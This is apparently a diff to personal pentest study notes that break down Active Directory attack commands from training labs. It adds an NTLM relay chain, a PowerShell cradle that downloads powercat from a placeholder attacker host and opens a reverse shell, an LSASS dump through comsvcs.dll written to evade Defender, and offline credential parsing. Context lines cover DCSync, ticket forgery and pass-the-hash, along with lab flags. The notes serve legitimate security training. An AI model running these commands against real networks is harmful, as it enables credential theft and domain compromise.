@@ -1,6 +1,6 @@
 # Active Directory (Breakdowns)
 
-Teardowns for non-obvious AD commands. Phase-ordered coverage in [[Active Directory Methodology]], syntax in [[Active Directory]], decision logic in [[Active Directory (Decision Tree)]].
+Teardowns for non-obvious AD commands. Phase-ordered coverage in [[Active Directory Methodology]], syntax in [[Active Directory]], decision logic in [[Active Directory (Decision Tree)]]. The core module arc starts at [[22. Active Directory Introduction and Enumeration]]; see also [[23. Attacking Active Directory Authentication]] and [[24. Lateral Movement in Active Directory]].
 
 ---
 
@@ -20,11 +20,11 @@ Set-DomainUserPassword -Identity damundsen -AccountPassword $newPass -Credential
 - `Set-DomainUserPassword -Identity damundsen` → PowerView function that calls `net ads password` / ADSI under the hood to reset the named account's password. Requires `User-Force-Change-Password` or `GenericAll` ACE on the target account for the credential used in `-Credential`.
 - `-Verbose` → shows the LDAP call being made, useful for confirming the correct DC was contacted.
 
-**Where this comes from:** PowerView source; ACL abuse chain from [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|AD.10]]; [[github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/acl-persistence-abuse.md|HackTricks ACL persistence]]
+**Where this comes from:** PowerView source; ACL abuse chain from [[22. Active Directory Introduction and Enumeration|AD.10]]; [[github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/acl-persistence-abuse.md|HackTricks ACL persistence]]
 
 **Where to look in the response:** the Verbose output shows `Set-DomainUserPassword ... LDAP://...` followed by `[VERBOSE] Setting password for user damundsen...`. No news is good news: PowerView is silent on success unless you use `-Verbose`. If it throws an error, the ACE is missing or the password doesn't meet complexity requirements.
 
-🔁 **Seen in:** [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|AD.10 wley→damundsen→Help Desk Level 1→adunn chain]]
+🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration|AD.10 wley→damundsen→Help Desk Level 1→adunn chain]]
 
 ---
 
@@ -43,11 +43,11 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 - The SPN causes the KDC to issue a TGS ticket for adunn encrypted with adunn's NTLM hash. Rubeus requests that ticket and you crack it offline.
 - **Cleanup required:** `Set-DomainObject ... -Clear serviceprincipalname` to remove the fake SPN after cracking.
 
-**Where this comes from:** [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|AD.10]], [[github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/acl-persistence-abuse.md|HackTricks ACL. GenericWrite]]
+**Where this comes from:** [[22. Active Directory Introduction and Enumeration|AD.10]], [[github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/acl-persistence-abuse.md|HackTricks ACL. GenericWrite]]
 
 **Where to look in the response:** `klist` after Rubeus should show a new TGS ticket for the target account. If you get "KRB_AP_ERR_MODIFIED" in Rubeus, the SPN format is wrong or conflicting with a real SPN, try a different class/hostname string.
 
-🔁 **Seen in:** [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|AD.10 step 3: Set SPN → targeted Kerberoast]]
+🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration|AD.10 step 3: Set SPN → targeted Kerberoast]]
 
 ---
 
@@ -71,11 +71,11 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 - `/user:hacker` → the username claimed in the ticket. Arbitrary; doesn't need to exist in AD. The PAC's group memberships (including the injected EA SID) determine access, not the username.
 - `/ptt` → Pass The Ticket: load the forged ticket directly into the current session's Kerberos cache. Equivalent to `kerberos::ptt` in mimikatz.
 
-**Where this comes from:** [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.16. Child→Parent Trust Attack (Windows. ExtraSids)|AD.16]]; [[github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/sid-history-injection.md|HackTricks SID History Injection]]
+**Where this comes from:** [[22. Active Directory Introduction and Enumeration|AD.16]]; [[github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/sid-history-injection.md|HackTricks SID History Injection]]
 
 **Where to look in the response:** `klist` immediately after should show the injected ticket. Then `ls \\parentdc.parent.local\c$` confirms access, a successful directory listing means the parent DC accepted the ticket and treated you as Enterprise Admin.
 
-🔁 **Seen in:** [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.16. Child→Parent Trust Attack (Windows. ExtraSids)|AD.16 ExtraSids → parent DC access → f@ll1ng_l1k3_d0m1no3$]]
+🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration|AD.16 ExtraSids → parent DC access → f@ll1ng_l1k3_d0m1no3$]]
 
 ---
 
@@ -96,11 +96,11 @@ dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountContro
 - `-attr samAccountName description` → only print these two attributes (no noise).
 - `-limit 50` → stop after 50 results.
 
-**Where this comes from:** [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.8.3. dsquery. LDAP Filter for Disabled Admin Accounts with Descriptions|AD.8.3]]; LDAP filter syntax from RFC 4515
+**Where this comes from:** [[22. Active Directory Introduction and Enumeration|AD.8.3]]; LDAP filter syntax from RFC 4515
 
 **Where to look in the response:** any account where the description field contains something like "Password123!" or "last changed 2019-03". Disabled admin accounts with memorable descriptions are common in enterprise environments that don't have a formal offboarding process.
 
-🔁 **Seen in:** [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.8. Living Off the Land|AD.8]] Living Off the Land section, adunn appeared with description → Q answer HTB{LD@P_I$_W1ld}
+🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration|AD.8]] Living Off the Land section, adunn appeared with description → Q answer HTB{LD@P_I$_W1ld}
 
 ---
 
@@ -135,7 +135,7 @@ LDAPSearch -LDAPQuery "(samAccountType=805306368)"
 
 **Where to look in the response:** Each result has `.Properties`, access attributes like `$result.properties.memberof`, `$result.properties.description`, `$result.properties.physicaldeliveryofficename`. For nested group chains: `$result.properties.member` shows member DNs including any nested group DNs (look for `CN=GroupName,` at the start, those are groups, not users). Run another LDAPSearch query on the nested group's CN to go one level deeper.
 
-🔁 **Seen in:** [[Active Directory Introduction and Enumeration#22.2.3 Adding Search Functionality to our Script|Module 22 §22.2.3]]. LDAPSearch used to find nested group chain Service Personnel → Billing → Customer support → michelle; michelle's description attribute contained the flag.
+🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration#22.2.3 Adding Search Functionality to our Script|Module 22 §22.2.3]]. LDAPSearch used to find nested group chain Service Personnel → Billing → Customer support → michelle; michelle's description attribute contained the flag.
 
 ---
 
@@ -169,7 +169,7 @@ mimikatz # kerberos::golden /ptt /sid:S-1-5-21-1987370270-658905905-1781884369 /
 
 **Where to look in the response:** Mimikatz prints `Silver ticket for 'jeffadmin @ corp.com' successfully submitted for current session`. Then `klist` shows the injected ticket under Group 0 as a TGS for the target SPN. Then `iwr -UseDefaultCredentials http://web04` (or equivalent) to actually use it.
 
-🔁 **Seen in:** [[Attacking Active Directory Authentication#23.2.4 Silver Tickets|Module 23 §23.2.4]], forged http/web04.corp.com as jeffadmin → flag OS{c1f252d8a7b98d70a86df3bb65559f94}
+🔁 **Seen in:** [[23. Attacking Active Directory Authentication#23.2.4 Silver Tickets|Module 23 §23.2.4]], forged http/web04.corp.com as jeffadmin → flag OS{c1f252d8a7b98d70a86df3bb65559f94}
 
 ---
 
@@ -198,7 +198,7 @@ Mimikatz opens an RPC connection to the DC and calls `IDL_DRSGetNCChanges`, part
 - `aes256_hmac (4096)` — use with /aes256 in Kerberos tool flags (AES is quieter than RC4 in SIEM logs)
 - `Password history` — old passwords, useful if the user might have reused them elsewhere
 
-🔁 **Seen in:** [[Attacking Active Directory Authentication#23.2.5 Domain Controller Synchronization (DCSync)|Module 23 §23.2.5]], dumped krbtgt NTLM: 1693c6cefafffc7af11ef34d1c788f47
+🔁 **Seen in:** [[23. Attacking Active Directory Authentication#23.2.5 Domain Controller Synchronization (DCSync)|Module 23 §23.2.5]], dumped krbtgt NTLM: 1693c6cefafffc7af11ef34d1c788f47
 
 ---
 
@@ -222,7 +222,7 @@ mimikatz # sekurlsa::pth /user:maria /domain:corp.com /ntlm:2a944a58d4ffa77137b2
 - `sekurlsa::pth` → spawns an interactive shell on the CURRENT Windows machine → ideal for GUI/interactive exploration
 - `impacket-psexec -hashes` → remote shell on the TARGET machine → ideal from Kali
 
-🔁 **Seen in:** [[Attacking Active Directory Authentication#23.2.5 Domain Controller Synchronization (DCSync)|Module 23 §23.2.5 Capstone VM Group 2]]. PtH as maria → accessed \\192.168.249.70\c$\ → flag.txt
+🔁 **Seen in:** [[23. Attacking Active Directory Authentication#23.2.5 Domain Controller Synchronization (DCSync)|Module 23 §23.2.5 Capstone VM Group 2]]. PtH as maria → accessed \\192.168.249.70\c$\ → flag.txt
 
 ---
 
@@ -244,11 +244,11 @@ Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Creat
 - `-Arguments @{CommandLine = $command}` → PowerShell hashtable supplying the method's input parameters. `CommandLine` is the WMI Win32_Process.Create() parameter name for what to run.
 - **Session 0 caveat:** `Win32_Process.Create()` always spawns in Session 0 (the non-interactive service session). The process is invisible on the target's desktop. `ReturnValue = 0` confirms success; the `ProcessId` in the output is its PID, verifiable with `tasklist` on the target.
 
-**Where this comes from:** [[https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-process|MSDN Win32_Process.Create()]] | [[Lateral Movement in Active Directory#24.1.1 WMI and WinRM|Module 24 §24.1.1]]
+**Where this comes from:** [[https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-process|MSDN Win32_Process.Create()]] | [[24. Lateral Movement in Active Directory#24.1.1 WMI and WinRM|Module 24 §24.1.1]]
 
 **Where to look in the response:** `ReturnValue = 0` and a `ProcessId` value. Any non-zero ReturnValue is a failure: 2 = access denied, 8 = unknown failure, 9 = path not found, 21 = invalid parameter.
 
-🔁 **Seen in:** [[Lateral Movement in Active Directory#24.1.1 WMI and WinRM|Module 24 §24.1.1 Lab VM Group 2]], spawned reverse shell on web04 as corp\jen
+🔁 **Seen in:** [[24. Lateral Movement in Active Directory#24.1.1 WMI and WinRM|Module 24 §24.1.1 Lab VM Group 2]], spawned reverse shell on web04 as corp\jen
 
 ---
 
@@ -273,12 +273,100 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 - `reg.exe save hklm\system c:\system.bak` → exports the SYSTEM registry hive. The SYSTEM hive contains the Boot Key (also called SYSKEY), which is used to encrypt the Password Encryption Key (PEK) stored in ntds.dit. Without the SYSTEM hive, secretsdump cannot derive the PEK and cannot decrypt any hashes.
 - `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` → `LOCAL` tells secretsdump to work on local files rather than connecting to a live DC. It: (1) extracts the Boot Key from system.bak, (2) decrypts the PEK from ntds.dit.bak using the Boot Key, (3) decrypts each account's stored credentials using the PEK. Output format: `username:RID:LM_hash:NT_hash:::`.
 
-**Where this comes from:** [HackTricks NTDS extraction](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/ntds.md) | [[Lateral Movement in Active Directory#24.2.2 Shadow Copies (VSS)|Module 24 §24.2.2]]
+**Where this comes from:** [HackTricks NTDS extraction](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/ntds.md) | [[24. Lateral Movement in Active Directory#24.2.2 Shadow Copies (VSS)|Module 24 §24.2.2]]
 
 **Where to look in the response:** `vshadow.exe` output prints `Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`, **this exact string** goes into the copy command. The number at the end (2) increments if previous shadow copies exist on the volume. Always use the device name from the current vshadow run, not a hardcoded one.
 
-🔁 **Seen in:** [[Lateral Movement in Active Directory#24.2.2 Shadow Copies (VSS)|Module 24 §24.2.2]], extracted NTDS.dit from DC1 to recover all domain hashes offline
+🔁 **Seen in:** [[24. Lateral Movement in Active Directory#24.2.2 Shadow Copies (VSS)|Module 24 §24.2.2]], extracted NTDS.dit from DC1 to recover all domain hashes offline
 
 ---
 
-#### Tags: #CommandBreakdowns #ActiveDirectory #ACLAbuse #PSCredential #SetDomainObject #ExtraSids #Rubeus #dsquery #GoldenTicket #SilverTicket #DCSync #PtH #DRSProtocol #Mimikatz #HTBSupplementary #Module22 #Module23 #LDAPSearch #DirectorySearcher #ADSI #samAccountType #WMI #CIMSession #DCOM #ShadowCopy #vshadow #NTDS #secretsdump #LateralMovement #Module24
+---
+
+## impacket-ntlmrelayx — full NTLM relay chain with -c command execution
+
+**Full command:**
+```bash
+sudo impacket-ntlmrelayx \
+  --no-http-server \
+  -smb2support \
+  -t 192.168.50.242 \
+  -c "powershell -enc SQBFAFgA..."
+```
+
+**Piece by piece:**
+- `sudo` → port 445 requires root. ntlmrelayx opens an SMB server on 445 to catch inbound authentication. Without sudo, the bind fails silently.
+- `--no-http-server` → disables the HTTP capture listener. ntlmrelayx can listen on both HTTP and SMB simultaneously; disabling HTTP avoids port conflicts when another service (nginx, wsgidav, python http.server) is already bound to 80.
+- `-smb2support` → enables SMB2/3 relay. SMB1 is disabled on all modern Windows (post-2017 security patches). Without this flag, ntlmrelayx only speaks SMB1 and the inbound connection is rejected before the relay attempt.
+- `-t 192.168.50.242` → the relay target. ntlmrelayx forwards the captured NTLM tokens to this address as if it were the original client. The target must have SMB signing **disabled** — check with `crackmapexec smb <targets> --gen-relay-list relayable.txt` or look for `signing:False` in CME output.
+- `-c "powershell -enc ..."` → command to execute on the relay target in the context of the relayed account. Runs via the Windows Service Control Manager (SCM), so the command needs to be short (SCM has a command-length limit). Base64+`-enc` avoids quoting problems with special characters.
+
+**Why base64 encoding for `-c`?** ntlmrelayx passes the `-c` string through Win32 SCM's `CreateService` → `StartService` API. Special characters (`'`, `(`, `)`, `;`, `/`) in the raw PowerShell payload break the SCM argument parser. Encoding as UTF-16LE base64 and running via `powershell -enc` bypasses all quoting issues — the encoded string is a single quoted argument with no special chars.
+
+**Generate the payload (must be UTF-16LE, not UTF-8):**
+```powershell
+$Text  = "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8888/powercat.ps1');powercat -c <KALI> -p 9999 -e powershell"
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)   # Unicode = UTF-16LE in .NET
+[Convert]::ToBase64String($Bytes)
+```
+
+**What triggers the relay?** Any application feature that initiates an outbound UNC/SMB connection to an attacker-controlled path. In the module context: WordPress Backup Migration plugin → backup directory set to `//KALI_IP/test`. Other triggers: printer settings pages, MSI install paths, network share browsing links.
+
+**Where to look in the output:** `[*] Authenticating against smb://<target> as <DOMAIN>/<USER> SUCCEED` → relay worked. `[*] Executed specified command on host: <target>` → SCM ran the command. A few seconds later your nc listener catches the shell.
+
+🔁 **Seen in:** [[27. Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin|Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin]]
+
+---
+
+## rundll32 comsvcs.dll MiniDump — Defender-safe LSASS dump
+
+**Full command:**
+```powershell
+rundll32 C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
+```
+
+**Piece by piece:**
+- `rundll32` → loads and calls an exported function from a DLL without a dedicated EXE wrapper. The calling convention is `rundll32 <dllpath> <ExportName> [args...]`.
+- `C:\Windows\System32\comsvcs.dll` → COM+ Services DLL, present and Microsoft-signed on all Windows versions. Defender does not quarantine calls to it — this is the whole point. Alternative dumping tools (ProcDump, Task Manager, mimilib) are often flagged; comsvcs.dll is not.
+- `MiniDump` → the export name inside comsvcs.dll that wraps `MiniDumpWriteDump()` from `dbghelp.dll`. The function signature it exposes is `MiniDump(PID, file, flags)`.
+- `<LSASS_PID>` → the numeric PID of `lsass.exe`. Get it with `Get-Process lsass` or `tasklist /FI "IMAGENAME eq lsass.exe"`. The PID changes each reboot.
+- `C:\Windows\Temp\lsass.dmp` → the output file path. Must be writable. `C:\Windows\Temp` is writable by SYSTEM (which you need to be anyway). `C:\Temp` works too if it exists.
+- `full` → maps to the `MiniDumpWithFullMemory` flag constant. Dumps the complete process address space, including the LSA cache pages that hold credential material. Without `full`, you get a minimal dump that pypykatz/mimikatz cannot extract creds from.
+
+**Why it bypasses Defender:** comsvcs.dll is a legitimate Microsoft component used by COM+ itself. Its MiniDump export has existed since Windows XP. Defender's AMSI and real-time protection focus on known-bad PE files and in-memory shellcode patterns — they do not flag calls to system-shipped DLL exports, even when applied to LSASS.
+
+**Requires SYSTEM:** MiniDumpWriteDump on LSASS requires `SeDebugPrivilege`, which is held by SYSTEM and Administrators (when UAC is elevated). A low-privilege user cannot dump LSASS even with this method.
+
+**What "silent" means:** `rundll32` does not print any output on success. The command returns to the prompt. Verify the dump with `dir C:\Windows\Temp\lsass.dmp` — a complete dump is typically 45-50 MB. If the file is 0 bytes or missing, check the PID and that you are SYSTEM.
+
+🔁 **Seen in:** [[27. Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1|Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1]]
+
+---
+
+## pypykatz lsa minidump — offline LSASS credential parsing
+
+**Full command:**
+```bash
+pypykatz lsa minidump /tmp/share/lsass.dmp
+```
+
+**Piece by piece:**
+- `pypykatz` → Python reimplementation of mimikatz's credential parsing logic. Runs entirely on Kali (or any Python host), no Windows required. Parses Windows LSASS dump files offline.
+- `lsa` → selects the LSA (Local Security Authority) subsystem parser. Other available subcommands: `registry` (for SAM/SECURITY hive parsing), `live` (for live LSASS dumping on Windows, not relevant from Kali).
+- `minidump` → specifies the input format as a Windows MiniDump (`.dmp`) file, as produced by comsvcs.dll, ProcDump, or Task Manager.
+- `/tmp/share/lsass.dmp` → path to the dump file.
+
+**Output structure:** one `== LogonSession ==` block per logon session. Each block contains:
+- `username` / `domainname` — the account and domain
+- `authentication_id` — LUID identifying the session
+- `msv` subsection — NTLM hashes (NT and LM). The NT hash is what you use for PtH.
+- `kerberos` subsection — cleartext password if WDigest is enabled or if the credential is still in the LSA cache.
+- `tspkg`, `wdigest`, `credman` — other SSPs, may contain cleartext in older or misconfigured environments.
+
+**Finding beccy in the output:** the dump contains sessions for every user who has logged in since the last reboot. Filter visually by `username` or pipe to `grep -A 20 "beccy"`. The NT hash is on the `NT:` line in the `msv` block.
+
+🔁 **Seen in:** [[27. Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1|Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1]]
+
+---
+
+#### Tags: #CommandBreakdowns #ActiveDirectory #ACLAbuse #PSCredential #SetDomainObject #ExtraSids #Rubeus #dsquery #GoldenTicket #SilverTicket #DCSync #PtH #DRSProtocol #Mimikatz #HTBSupplementary #Module22 #Module23 #LDAPSearch #DirectorySearcher #ADSI #samAccountType #WMI #CIMSession #DCOM #ShadowCopy #vshadow #NTDS #secretsdump #LateralMovement #Module24 #NTLMRelay #ntlmrelayx #comsvcs #MiniDump #pypykatz #LSASS #LateralMovement #Module27 #AssemblingThePieces
